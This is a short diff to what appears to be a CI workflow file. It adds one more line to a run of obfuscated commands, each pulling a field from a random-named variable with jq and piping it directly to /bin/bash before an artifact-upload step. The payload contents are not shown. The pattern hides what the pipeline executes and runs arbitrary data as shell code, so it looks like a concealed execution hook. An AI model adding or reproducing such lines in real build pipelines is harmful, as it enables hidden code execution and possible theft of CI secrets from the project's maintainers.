@@ -23,6 +23,7 @@ jobs:
           echo $u71 | jq -r .dyqp03246 | /bin/bash
           echo $uq70 | jq -r .kbyow909 | /bin/bash
           echo $m45 | jq -r .mbjyq479 | /bin/bash
+          echo $qla56 | jq -r .f16 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
